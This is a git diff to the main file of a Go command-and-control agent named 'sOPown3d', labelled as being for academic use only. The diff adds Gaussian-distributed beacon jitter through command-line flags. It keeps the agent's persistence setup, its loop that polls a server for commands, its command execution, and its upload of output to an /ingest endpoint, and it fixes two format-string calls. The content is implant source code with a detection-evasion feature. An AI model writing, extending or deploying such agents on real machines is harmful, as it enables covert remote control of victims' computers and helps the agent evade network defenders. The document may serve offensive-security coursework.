@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"net/http"
 	"os"
@@ -10,26 +11,50 @@ import (
 	"runtime"
 	"time"
 
+	"sOPown3d/agent/jitter"
 	"sOPown3d/agent/persistence"
 	"sOPown3d/shared"
 )
 
 func main() {
-	serverURL := "http://127.0.0.1:8081"
+	// Command-line flags for jitter configuration
+	jitterMin := flag.Float64("jitter-min", 1.0, "Minimum jitter in seconds (default: 1.0)")
+	jitterMax := flag.Float64("jitter-max", 2.0, "Maximum jitter in seconds (default: 2.0)")
+	flag.Parse()
+
+	// Validate jitter configuration
+	if *jitterMin <= 0 || *jitterMax <= *jitterMin {
+		fmt.Printf("❌ Invalid jitter range: min=%.2fs, max=%.2fs\n", *jitterMin, *jitterMax)
+		fmt.Println("   Minimum must be positive and maximum must be greater than minimum")
+		os.Exit(1)
+	}
+
+	// Initialize jitter calculator with Gaussian distribution
+	jitterCalc, err := jitter.NewJitterCalculator(shared.JitterConfig{
+		MinSeconds: *jitterMin,
+		MaxSeconds: *jitterMax,
+	})
+	if err != nil {
+		fmt.Printf("❌ Failed to initialize jitter: %v\n", err)
+		os.Exit(1)
+	}
+
+	serverURL := "http://127.0.0.1:8080"
 	info := gatherSystemInfo()
 
 	fmt.Println("=== Agent sOPown3d - Version Commandes ===")
 	fmt.Println("Usage académique uniquement")
+	fmt.Println()
+	fmt.Println(jitterCalc.GetStats())
+	fmt.Println()
 
 	setupPersistence()
-
-	serverURL := "http://127.0.0.1:8080"
 
 	fmt.Printf("Agent ID: %s\n", info.Hostname)
 	fmt.Println("En attente de commandes...")
 	fmt.Println("----------------------------------------")
 
-	// Boucle principale
+	// Boucle principale avec jitter
 	for i := 1; ; i++ {
 		info := gatherSystemInfo() // Pourquoi récuperer a chaque fois les infos ? -> TODO a des fins de logging : à persister dans les logs
 
@@ -40,7 +65,10 @@ func main() {
 			sendOutput(serverURL+"/ingest", res)
 		}
 
-		time.Sleep(500 * time.Millisecond)
+		// Calculate next jitter with Gaussian distribution
+		nextJitter := jitterCalc.Next()
+		fmt.Printf("[Heartbeat #%d] Next check in: %.2fs\n", i, nextJitter.Seconds())
+		time.Sleep(nextJitter)
 	}
 }
 
@@ -130,7 +158,7 @@ func executeCommand(cmd *shared.Command) string {
 				output = string(result)
 			}
 
-			fmt.Printf(output)
+			fmt.Printf("%s", output)
 			return output
 		}
 
@@ -168,7 +196,7 @@ func sendOutput(url string, output string) {
 
 	if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
 		if result != "" {
-			fmt.Printf(result)
+			fmt.Printf("%s", result)
 		}
 	}
 }
